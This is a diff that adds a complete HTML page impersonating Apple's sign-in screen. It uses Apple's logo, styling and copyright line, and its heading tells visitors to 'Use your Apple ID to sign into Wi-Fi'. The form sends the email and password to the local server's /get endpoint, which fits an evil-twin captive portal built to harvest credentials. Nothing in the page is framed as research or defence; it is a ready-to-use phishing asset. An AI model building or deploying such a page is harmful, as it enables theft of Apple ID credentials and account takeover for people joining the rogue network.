@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Apple ID Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: SF Pro Text, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
+            background: #f5f5f7;
+            color: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-bottom: 50px;
+            height: 100%;
+        }
+
+        .appleLogo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .appleLogo svg {
+            width: 60px;
+            height: auto;
+        }
+
+        .headerText {
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .subHeaderText {
+            font-size: 13.5px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        form {
+            width: 280px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #inputText {
+            margin-bottom: 15px;
+        }
+
+        #email,
+        #password {
+            width: 100%;
+            padding: 12.5px;
+            border: 1px solid #d2d2d7;
+            border-radius: 5px;
+            background-repeat: no-repeat;
+            background-position: calc(100% - 15px) center;
+            background-image: url('./input.svg');
+            background-size: 10%;
+            box-sizing: border-box;
+        }
+
+        input#appleid:focus,
+        input#password:focus {
+            outline: none;
+            box-shadow: 0 0 5px #007aff;
+        }
+
+        .button {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 5px;
+            border: none;
+            background-color: transparent;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .button svg {
+            width: 32px;
+            height: 32px;
+            fill: #000000;
+            margin-right: 5px;
+        }
+
+        .link {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .link a {
+            color: #007aff;
+        }
+
+        footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f5f5f7;
+            font-size: 12px;
+            border-top: 1px solid #d2d2d7;
+            padding: 4px;
+            box-sizing: border-box;
+            color: #808080;
+        }
+
+        .copyRightText {
+            color: #808080;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="appleLogo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 640 640">
+                <path d="M494.782 340.02c-.803-81.025 66.084-119.907 69.072-121.832-37.595-54.993-96.167-62.552-117.037-63.402-49.843-5.032-97.242 29.362-122.565 29.362-25.253 0-64.277-28.607-105.604-27.85-54.32.803-104.4 31.594-132.403 80.245C29.81 334.457 71.81 479.58 126.816 558.976c26.87 38.882 58.914 82.56 100.997 81 40.512-1.594 55.843-26.244 104.848-26.244 48.993 0 62.753 26.245 105.64 25.406 43.606-.803 71.232-39.638 97.925-78.65 30.887-45.12 43.548-88.75 44.316-90.994-.969-.437-85.029-32.634-85.879-129.439l.118-.035zM414.23 102.178C436.553 75.095 451.636 37.5 447.514-.024c-32.162 1.311-71.163 21.437-94.253 48.485-20.729 24.012-38.836 62.28-33.993 99.036 35.918 2.8 72.591-18.248 94.926-45.272l.036-.047z" />
+            </svg>
+        </div>
+
+        <div class="headerText">Use your Apple ID to sign into Wi-Fi</div>
+
+        <form action="/get" method="GET">
+            <div id="inputText">
+                <input type="email" id="email" name="email" placeholder="Apple ID" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button class="button" type="submit">
+                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" class="bi bi-arrow-right-circle" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd" d="M1 8a7 7 0 1 0 14 0A7 7 0 0 0 1 8zm15 0A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM4.5 7.5a.5.5 0 0 0 0 1h5.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3a.5.5 0 0 0 0-.708l-3-3a.5.5 0 1 0-.708.708L10.293 7.5H4.5z"/>
+                </svg>
+            </button>
+        </form>
+
+        <div class="link">
+            <a href="#">Forgot Apple ID or Password</a>
+        </div>
+        <div class="link">
+            <a href="#">Create Apple ID</a>
+        </div>
+    </div>
+    <footer>
+        <p class="copyRightText">&copy; 2023 Apple Inc. All rights reserved.</p>
+    </footer>
+</body>
+
+</html>
